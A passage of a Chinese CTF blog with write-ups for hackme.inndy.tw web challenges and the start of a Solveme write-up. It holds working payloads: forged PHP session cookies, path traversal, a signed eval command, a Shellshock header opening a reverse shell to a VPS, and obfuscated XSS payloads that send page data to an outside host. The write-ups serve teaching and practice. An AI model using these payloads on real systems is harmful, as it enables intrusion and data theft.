8\n\n以admin登录之后，抓包发现cookie很可疑\n\n![payload](hackme/11.png)\n\n解码之后发现`is_admin`字段为0，修改为1后还是不行，猜测应该是`login&sha512`字段没有对应修改，测试之后发现该字段为前一个cookie的sha512值，到此，payload脚本如下\n\n```php\n$s = 'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D';\n$s = urldecode($s);\n// echo $s;\n// echo hash('sha512',$s);\n$s = str_replace('\"is_admin\";b:0', '\"is_admin\";b:1', $s);\necho urlencode($s).'---';\necho hash('sha512',$s);\n```\n\n# login as admin8.1\n\n前一关已经以admin身份登入取得一个flag，猜想第二个flag应该是和debug模式有关，查看session发现存在dubug字段，将其修改为1，发现不会再报错debug模式不可用，但是依然没有什么其它东西，查看cookie发现还有一个dubug_dump字段，将其修改为config.php，相应的字段长度也要修改为10\n\n```php\n$s = 'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D';\n$s = urldecode($s);\n$s = str_replace('\"is_admin\";b:0', '\"is_admin\";b:1', $s);\n$s = str_replace('debug\";b:0', 'debug\";b:1', $s);\n$s = str_replace('debug_dump\";s:9:\"index.php', 'debug_dump\";s:10:\"config.php', $s);\necho urlencode($s).'---';\necho hash('sha512',$s);\n```\n\n![payload](hackme/12.png)\n\n# dafuq-manager 1\n\n查看cookie可以发现 ***show_hidden*** 字段为 ***no***，改为***yes***刷新即可得到flag\n\n# dafuq-manager 2\n\n这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag\n\n推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分\n\n```php\ncase \"admin\":\n        require \"./core/fun_admin.php\";\n        show_admin($GLOBALS[\"dir\"]);\n    break;\n```\n\n我们跟进fun_admin.php\n\n```php\nfunction show_admin($dir) {\n    $pwd = (($GLOBALS[\"permissions\"] & 2) == 2);\n    $admin = (($GLOBALS[\"permissions\"] & 4) == 4);\n    if (!$GLOBALS[\"require_login\"]) show_error($GLOBALS[\"error_msg\"][\"miscnofunc\"]);\n    if (isset($GLOBALS['__GET'][\"action2\"])) $action2 = $GLOBALS['__GET'][\"action2\"];\n    elseif (isset($GLOBALS['__POST'][\"action2\"])) $action2 = $GLOBALS['__POST'][\"action2\"];\n    else $action2 = \"\";\n    switch ($action2) {\n        case \"chpwd\":\n            if (!$pwd) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            changepwd($dir);\n            break;\n        case \"adduser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            adduser($dir);\n            break;\n        case \"edituser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            edituser($dir);\n            break;\n        case \"rmuser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            removeuser($dir);\n            break;\n        default:\n            if (!$pwd && !$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            admin($admin, $dir);\n    }\n}\n```\n\n主要的限制条件在于\n\n```php\n$pwd = (($GLOBALS[\"permissions\"] & 2) == 2);\n$admin = (($GLOBALS[\"permissions\"] & 4) == 4);\n```\n\n我们跟进这个变量看一下\n\n```php\nfunction activate_user($user, $pass) {\n    $data = find_user($user, $pass);\n    if ($data == NULL) return false;\n    $GLOBALS['__SESSION'][\"s_user\"] = $data[0];\n    $GLOBALS['__SESSION'][\"s_pass\"] = $data[1];\n    $GLOBALS[\"home_dir\"] = $data[2];\n    $GLOBALS[\"home_url\"] = $data[3];\n    $GLOBALS[\"show_hidden\"] = $data[4];\n    $GLOBALS[\"no_access\"] = $data[5];\n    $GLOBALS[\"permissions\"] = $data[6];\n    return true;\n}\n```\n\n再定位到find_user()\n\n```php\nfunction &find_user($user, $pass) {\n    $cnt = count($GLOBALS[\"users\"]);\n    for ($i = 0;$i < $cnt;++$i) {\n        if ($user == $GLOBALS[\"users\"][$i][0]) {\n            if ($pass == NULL || ($pass == $GLOBALS[\"users\"][$i][1] && $GLOBALS[\"users\"][$i][7])) {\n                return $GLOBALS[\"users\"][$i];\n            }\n        }\n    }\n    return NULL;\n}\n```\n\n可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量\t\n\n```php\n$GLOBALS[\"users\"] = array(\n    array(\"guest\", \"084e0343a0486ff05530df6c705c8bb4\", \"./data/guest\", \"https://game1.security.ntu.st/data/guest\", 0, \"^.ht\", 1, 1),\n);\n```\n\n但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数\n\n在fun_down.php文件中可以找到一个readfile()函数\n\n```php\n<?php\nrequire_once ('core/secure.php');\nfunction download_item($dir, $item) {\n    $item = basename($item);\n    if (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $abs_item = get_abs_item($dir, $item);\n    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $browser = id_browser();\n    header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream'));\n    header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');\n    header('Content-Transfer-Encoding: binary');\n    header('Content-Length: ' . filesize($abs_item));\n    if ($browser == 'IE') {\n        header('Content-Disposition: attachment; filename=\"' . $item . '\"');\n        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');\n        header('Pragma: public');\n    } else {\n        header('Content-Disposition: attachment; filename=\"' . $item . '\"');\n        header('Cache-Control: no-cache, must-revalidate');\n        header('Pragma: no-cache');\n    }\n    @readfile($abs_item);\n    exit;\n}\n```\n\n题目过滤部分如下\n\n```php\nif (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $abs_item = get_abs_item($dir, $item);\n    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n```\n\n我们要读取的是 `.config/.htusers.php` ，但是在题目的 `stristr($abs_item, '.php') || stristr($abs_item, 'config')` 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中\n\n```php\nfunction edit_file($dir, $item) {\n    if (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $fname = get_abs_item($dir, $item);\n    if (!file_in_web($fname)) show_error($GLOBALS[\"error_msg\"][\"accessfile\"]);\n    if (isset($GLOBALS['__POST'][\"dosave\"]) && $GLOBALS['__POST'][\"dosave\"] == \"yes\") {\n        $item = basename(stripslashes($GLOBALS['__POST'][\"fname\"]));\n        $fname2 = get_abs_item($dir, $item);\n        if (!isset($item) || $item == \"\") show_error($GLOBALS[\"error_msg\"][\"miscnoname\"]);\n        if ($fname != $fname2 && @file_exists($fname2)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"itemdoesexist\"]);\n        savefile($dir, $fname2);\n        $fname = $fname2;\n    }\n    $fp = @fopen($fname, \"r\");\n    if ($fp === false) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"openfile\"]);\n    $s_item = get_rel_item($dir, $item);\n    if (strlen($s_item) > 50) $s_item = \"...\" . substr($s_item, -47);\n    show_header($GLOBALS[\"messages\"][\"actedit\"] . \": /\" . $s_item); \n```\n\n函数中有三条过滤\n\n```php\nif (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\nif (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\nif (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n```\n\n第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下\n\n```php\nfunction get_show_item($dir, $item) {\n    if ($item == \".\" || $item == \"..\") return false;\n    if ($_COOKIE['help'] == 'me') {\n        $_COOKIE['help'] = null;\n        setcookie('help', '', time() - 9999999999);\n        echo '<script>alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")</script>';\n    }\n    if (empty($_COOKIE['show_hidden'])) {\n        setcookie('show_hidden', 'no', time() + 3600);\n    }\n    if (substr($item, 0, 1) == \".\" && $GLOBALS[\"show_hidden\"] == false && $_COOKIE['show_hidden'] != 'yes') return false;\n    if ($GLOBALS[\"no_access\"] != \"\" && @eregi($GLOBALS[\"no_access\"], $item)) return false;\n    if ($GLOBALS[\"show_hidden\"] == false) {\n        $dirs = explode(\"/\", $dir);\n        foreach ($dirs as $i) if (substr($i, 0, 1) == \".\") return false;\n    }\n    return true;\n}\n```\n\n题目仅仅对$item进行了简单的过滤， `if ($item == \".\" || $item == \"..\") return false;` ，那么我们可以考虑用目录穿越 `../../` 绕过\n\n那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）\n\n```\nhttps://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../../../../var/www/webhdisk/.config/.htusers.php&order=name&srt=yes&lang=en\n```\n\n于是可以读到目标文件\n\n![.htusers.php](hackme/3.png)\n\n然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 `how do you turn this on` ，登录即可读取flag\n\n# dafuq-manager 3\n\n题目给出了信息\n\n> For flag3, you need a shell to get that. see $WEBROOT/flag3!\n\n这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 `eval` ，在fun_debug.php中发现存在该函数，跟进一下\n\n```php\nfunction do_debug() {\n    assert(strlen($GLOBALS['secret_key']) > 40);\n    $dir = $GLOBALS['__GET']['dir'];\n    if (strcmp($dir, \"magically\") || strcmp($dir, \"hacker\") || strcmp($dir, \"admin\")) {\n        show_error('You are not hacky enough :(');\n    }\n    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);\n    $cmd = base64_decode($cmd);\n    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);\n    foreach ($bad_things as $bad) {\n        if (stristr($cmd, $bad)) {\n            die('2bad');\n        }\n    }\n    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]), $hmac)) {\n        die(eval($cmd));\n    } else {\n        show_error('What does the fox say?');\n    }\n}\n```\n\n对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS['\\_\\_GET']['command']变量的生成，题目也给出了生成函数\n\n```php\nfunction make_command($cmd) {\n    $hmac = hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]);\n    return sprintf('%s.%s', base64_encode($cmd), $hmac);\n}\n```\n\n所以我们可以自己生成command\n\n```php\n<?php \nfunction make_command($cmd) {\n    $hmac = hash_hmac('sha256', $cmd, \"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\");\n    return sprintf('%s.%s', base64_encode($cmd), $hmac);\n}\nvar_dump(make_command('$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'));\n?>\n```\n\n注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下\n\n```\nhttps://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=admin&command=JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&order=name&srt=yes&lang=en\n```\n\n做完后感觉自己好菜呀，这代码审计的我晕头转向，233333...\n\n# wordpress 1\n\nWordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 `wp-content/plugins/core.php` 中发现了一段代码\n\n```php\nfunction print_f14g()\n{\n\t$h = 'm'.sprintf('%s%d','d',-4+9e0);\n\tif($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {\n\t\tif(wp_get_user_ip() === '127.0.0.1') {\n\t\t\teval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));\n\t\t} else {\n\t\t\tdie('</head><body><h1>Sorry, Only admin from localhost can get flag');\n\t\t}\n\t}\n}\n```\n\n我们把代码中的md5解密一下发现是 `cat flag`，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问\n\n```\nhttps://wp.hackme.inndy.tw/?passw0rd=cat%20flag\n```\n\n查看元素即可找到flag\n\n# wordpress 2\n\n随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句\n\n```php\n<!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?> -->\n```\n\n看到query，应该是在搜索页面，所以我们提交的payload应该为\n\n```\nhttps://wp.hackme.inndy.tw/archives/date/2013/10?s=&debug=content\n```\n\n# command-executor\n\n随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件\n\n```\nhttps://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index\n```\n\nbase64解码一下得到源代码\n\n```php\n<?php\n$pages = [\n    ['man', 'Man'],\n    ['untar', 'Tar Tester'],\n    ['cmd', 'Cmd Exec'],\n    ['ls', 'List files'],\n];\n\nfunction fuck($msg) {\n    header('Content-Type: text/plain');\n    echo $msg;\n    exit;\n}\n\n$black_list = [\n    '\\/flag', '\\(\\)\\s*\\{\\s*:;\\s*\\};'\n];\n\nfunction waf($a) {\n    global $black_list;\n    if(is_array($a)) {\n        foreach($a as $key => $val) {\n            waf($key);\n            waf($val);\n        }\n    } else {\n        foreach($black_list as $b) {\n            if(preg_match(\"/$b/\", $a) === 1) {\n                fuck(\"$b detected! exit now.\");\n            }\n        }\n    }\n}\n\nwaf($_SERVER);\nwaf($_GET);\nwaf($_POST);\n\nfunction execute($cmd, $shell='bash') {\n    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));\n}\n\nforeach($_SERVER as $key => $val) {\n    if(substr($key, 0, 5) === 'HTTP_') {\n        putenv(\"$key=$val\");\n    }\n}\n\n$page = '';\n\nif(isset($_GET['func'])) {\n    $page = $_GET['func'];\n    if(strstr($page, '..') !== false) {\n        $page = '';\n    }\n}\n\nif($page && strlen($page) > 0) {\n    try {\n        include(\"$page.php\");\n    } catch (Exception $e) {\n    }\n}\n?>\n```\n\n题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 `CVE-2014-6271(破壳（shellsock）漏洞)` ，在freebuf中有一个链接\n\n> http://www.freebuf.com/articles/system/45390.html\n\n国外有一个漏洞利用的文章，\n\n> https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php\n\n![exp](hackme/4.png)\n\n但是直接利用会被waf掉，所以我们要考虑绕过正则\n\n```\n'\\(\\)\\s*\\{\\s*:;\\s*\\};'\n```\n\n题目的正则中 `:;` 是存在漏洞的，我们可以用 `: ;` 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 `\\/flag` 我们可以利用通配符绕过，\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/cat ../../../?lag-reader.c\" -q -O -  \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n但是并没有出现flag，发现是因为只有root才有文件的读权限\n\n![](hackme/5.png)\n\n但是题目中有一个flag-reader文件，我们尝试读取一下\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c\" -q -O - \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n```c\ninclude <unistd.h>\n#include <syscall.h>\n#include <fcntl.h>\n#include <string.h>\n\nint main(int argc, char *argv[])\n{\n\tchar buff[4096], rnd[16], val[16];\n\tif(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {\n\t\twrite(1, \"Not enough random\\n\", 18);\n\t}\n\n\tsetuid(1337);\n\tseteuid(1337);\n\talarm(1);\n\twrite(1, &rnd, sizeof(rnd));\n\tread(0, &val, sizeof(val));\n\n\tif(memcmp(rnd, val, sizeof(rnd)) == 0) {\n\t\tint fd = open(argv[1], O_RDONLY);\n\t\tif(fd > 0) {\n\t\t\tint s = read(fd, buff, 1024);\n\t\t\tif(s > 0) {\n\t\t\t\twrite(1, buff, s);\n\t\t\t}\n\t\t\tclose(fd);\n\t\t} else {\n\t\t\twrite(1, \"Can not open file\\n\", 18);\n\t\t}\n\t} else {\n\t\twrite(1, \"Wrong response\\n\", 16);\n\t}\n}\n\n```\n\n代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/bash -i >& /dev/tcp/your_vps_ip/8888 0>&1\" -q -O -  \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag\n\n```bash\nflag-reader flag > /var/tmp/content < /var/tmp/content\n```\n\n```\ncat content\n```\n\n# xssme\n\n先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下\n\n```\n<script>alert('123')</script>\n```\n\n回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做\n\n![payload](hackme/7.png)\n\n然后在自己的ceve账号中收到回显\n\n![回显](hackme/6.png)\n\n# xssrf leak\n\n上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显\n\n> Admin only allowed from localhost, but you came from 192.168.123.1\n\n修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法\n\n```\n<svg/onload=\"document.location='http://ov0eg5.ceye.io/?'+btoa(document.body.innerHTML)\">\n```\n\n但是遭到了过滤，我们可以考虑用HTML实体编码绕过\n\n```\n<svg/onload=\"&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#111;&#118;&#48;&#101;&#103;&#53;&#46;&#99;&#101;&#121;&#101;&#46;&#105;&#111;&#47;&#63;&#39;&#43;&#98;&#116;&#111;&#97;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#105;&#110;&#110;&#101;&#114;&#72;&#84;&#77;&#76;&#41;\">\n```\n\n果然可以收到payload，base64解码一下再保存为html格式打开\n\n![](hackme/8.png)\n\nsend request功能有个request.php，尝试读取该页面\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"GET\",\"request.php\",true);\nxmlhttp.send();\n\">\n```\n\n编码一下\n\n```\n<svg/onload=\"&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#61;&#110;&#101;&#119;&#32;&#88;&#77;&#76;&#72;&#116;&#116;&#112;&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#40;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#110;&#114;&#101;&#97;&#100;&#121;&#115;&#116;&#97;&#116;&#101;&#99;&#104;&#97;&#110;&#103;&#101;&#61;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#10;&#123;&#10;&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#97;&#100;&#121;&#83;&#116;&#97;&#116;&#101;&#61;&#61;&#52;&#32;&#38;&#38;&#32;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#116;&#97;&#116;&#117;&#115;&#61;&#61;&#50;&#48;&#48;&#41;&#10;&#32;&#32;&#32;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#49;&#51;&#56;&#46;&#54;&#56;&#46;&#50;&#57;&#46;&#57;&#50;&#58;&#50;&#51;&#51;&#51;&#51;&#47;&#63;&#39;&#43;&#98;&#116;&#111;&#97;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#84;&#101;&#120;&#116;&#41;&#59;&#10;&#32;&#32;&#32;&#32;&#125;&#10;&#125;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#112;&#101;&#110;&#40;&#34;&#71;&#69;&#84;&#34;&#44;&#34;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#112;&#104;&#112;&#34;&#44;&#116;&#114;&#117;&#101;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#101;&#110;&#100;&#40;&#41;&#59;\">\n```\n\n然后在vps上即可收到base64字符串，解码\n\n![](hackme/9.png)\n\n这应该就是题目的利用位置，我们尝试读config.php文件\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"POST\",\"request.php\",true);\nxmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send(\"url=file:///var/www/html/config.php\");\n\">\n```\n\n编码发送，果然可以收到flag\n\n![result](hackme/10.png)\n\n# xssrf redis\n\n题目漏洞点在于gopher未授权访问\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"POST\",\"request.php\",true);\nxmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send(\"url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit\");\n\">\n```\n\n发现有flag，读取之\n\n```\nxmlhttp.send(\"url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit\");\n```\n\n然后处理一下即可得到flag","tags":["CTF"],"categories":["writeup"]},{"title":"Solveme题解","url":"/2018/07/31/solveme/","content":"\n# 前言\n\n最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下\n\n<!--more-->\n\n# Warm up\n\n逆向跑一遍即可\n\n```php\n<?php \n$flag = '1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=';\necho hex2bin(strrev(bin2hex(base64_decode($flag))));\n?>\n```\n\n# Bad compare\n\n这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦\n\n# Winter sleep\n\n利用PHP的数字解析漏洞，payload\n\n```\n?time=6e6\n```\n\n# Hard login\n\n这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 <code>curl</code>，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以\n\n```\ncurl http://hardlogin.solveme.peng.kr/index.php\n```\n\n# URL filtering\n\n分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 <code>do_you_want_flag</code>,value中不能出现 <code>yes</code>，但是再获取flag时又要求必须是 <code>do_you_want_flag=yes</code>，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话\n\n> 对严重不合格的 URL，parse_url() 可能会返回 FALSE。\n\n所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload\n\n```\nhttp://urlfiltering.solveme.peng.kr///?do_you_want_flag=yes\n```\n\n# Hash collision\n\n直接数组绕过\n\n```\n?foo[]=1&bar[]=2\n```\n\n# Array2String\n\n题目核心在于提交 <code>15th_HackingCamp</code>对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述\n\n> Note that if the number is higher than 256, it will return the number mod 256.\n\n就是说如果数字大于256的话它会自动取模，所以就简单了\n\n```\nhttp://array2string.solveme.peng.kr/index.php?password=simple_passw0rd&value[]=305&value[]=309&value[]=372&value[]=360&value[]=351&value[]=328&value[]=353&value[]=355&value[]=363&value[]=361&value[]=366&value[]=359&value[]=323&value[]=353&value[]=365&value[]=368\n```\n\n# Flag not found\n\n# Give me a link 2\n\n```php\nif(isset($_GET['url'])){\n    $url = $_GET['url'];\n\nif(preg_match('/_|\\s|\\0/', $url)){\n    die('Not allowed character');\n}\n\n$parse = parse_url($url);\n    if(!preg_match('/^https?$/i', $parse['scheme'])){\n        die('Not allowed scheme');\n}\n\nif(!preg_match('/^(localhost|127\\.\\d+\\.\\d+\\.\\d+|[^.]+)(\\:\\d+)?$/i', $parse['host'])){\n    die('Not allowed host');\n}\n\nif(!preg_match('/\\/plz_give_me$/', $parse['path'])){\n    die('Not allowed path');\n}\n}\n```\n\n分析代码，题目过滤了几个条件\n\n> 1、 url中不能出现 `_` 以及其他不可见字符\n2、 path字段中又必须出现 `plz_give_me` 字段\n3、 限制输入的网址必须是 `localhost` 或 `127.x.x.x` 这种类型的网址\n\n1和2冲突，可以用前面一题的方法绕过之\n对于第三个，有个绕过方法就是 `ip2long()` 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤\n\n所以最终payload为\n\n```\nhttps://givemealink2.solveme.peng.kr/?url=https:num_ip:12580/plz%0agive%0ame\n```\n\n# Give me a link\n\n关键代码如下\n\n```php\nif(preg_match('/_|\\s|\\0/', $url)){\n        die('Not allowed character');\n    }\n\n    if(!preg_match('/^https?\\:\\/\\/'.$_SERVER['HTTP_HOST'].'/i', $url)){\n        die('Not allowed URL');\n    }\n\n    $parse = parse_url($url);\n    if($parse['path'] !== '/plz_give_me'){\n        die('Not allowed path');\n    }\n\n    curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);\n```\n\n第一个和第三个的条件矛盾，具体参见前文，其中 `$_SERVER['HTTP_HOST']` 又和\n\n`\ncurl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);\n` \n\n矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知\n\n> $url = 